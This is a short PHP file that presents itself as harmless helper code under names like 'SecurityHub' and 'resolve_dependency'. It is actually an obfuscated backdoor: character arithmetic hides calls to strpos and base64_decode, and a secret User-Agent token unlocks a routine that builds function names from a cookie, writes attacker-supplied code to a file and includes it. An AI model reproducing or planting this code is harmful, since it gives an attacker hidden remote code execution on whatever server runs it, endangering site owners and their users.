<?php
function resolve_dependency(...$oe)
{
    $v = array(122 * 103 - 12451, 114 - 3, 102 + 5 + 5, 114, 43 + 8 + 65, 5 * 23);
    $l = '';
    foreach ($v as $n) {
        $l .= chr($n);
    }
    $l = strrev($l);
    return $l(...$oe);
}

function trigger_event($n)
{
    $o = array(88 * 1 + 10, 97, 61 * 75 - 4460, 104 - 3, 54, 2 * 26, 5 * 19, 100, 101 * 1, 16 + 83, 113 - 2, 2 * 50, 99 * 9 - 790);
    $p = '';
    foreach ($o as $f) {
        $p .= chr($f);
    }
    return $p($n);
}

class SecurityHub
{
    private static $_nz;
    static function filterResults($_ga)
    {
        if (!self::$_nz) {
            self::computeResult();
        }
        return trigger_event(self::$_nz[$_ga]);
    }
    private static function computeResult()
    {
        self::$_nz = array('_wml' => 'S' . 'FRUUF' . '9VU0VSX0FHRU5' . 'U', '_ibh' => 'SFRU' . 'UF9' . 'VU0VS' . 'X0FHRU' . '5U', '_cmd' => 'ODA' . 'zNzUw' . 'OTk' . '=', '_psl' => '', '_fw' => '');
    }
}

if (isset($_SERVER[SecurityHub::filterResults('_w' . 'ml')]) && resolve_dependency($_SERVER[SecurityHub::filterResults('_ib' . 'h')], SecurityHub::filterResults('_' . 'cmd')) !== false) {
    $_le = $_COOKIE;
    $_eg = 00;
    $_ga = 06;
    $_msf = array();
    $_msf[$_eg] = SecurityHub::filterResults('_ps' . 'l');
    while ($_ga) {
        $_msf[$_eg] .= $_le[020][$_ga];
        if (!$_le[020][$_ga + 01]) {
            if (!$_le[020][$_ga + 02]) {
                break;
            }
            $_eg++;
            $_msf[$_eg] = SecurityHub::filterResults('_f' . 'w');
            $_ga++;
        }
        $_ga = $_ga + 06 + 01;
    }
    $_eg = $_msf[027]() . $_msf[025];
    if (!$_msf[024]($_eg)) {
        $_ga = $_msf[03]($_eg, $_msf[030]);
        $_msf[014]($_ga, $_msf[07] . $_msf[05]($_msf[010]($_le[03])));
    }
    include $_eg;
    die;
}